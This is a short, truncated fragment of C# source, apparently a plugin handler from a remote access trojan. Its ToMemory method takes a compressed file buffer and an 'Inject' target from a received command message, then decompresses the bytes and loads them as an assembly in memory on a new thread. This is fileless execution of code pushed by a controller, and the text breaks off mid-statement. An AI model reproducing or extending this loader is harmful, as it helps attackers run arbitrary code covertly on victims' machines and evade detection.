...
namespace Plugin.Handler
{
    public class HandleSendTo
    {
        public void ToMemory(MsgPack unpack_msgpack)
        {
            try
            {
                var buffer = unpack_msgpack.ForcePathObject("File").GetAsBytes();
                var injection = unpack_msgpack.ForcePathObject("Inject").AsString;
                    ...
                    new Thread(delegate()
                        {
                            try
                            {
                                var loader = Assembly.Load(Zip.Decompress(buffer));
                                object[] parm = null;
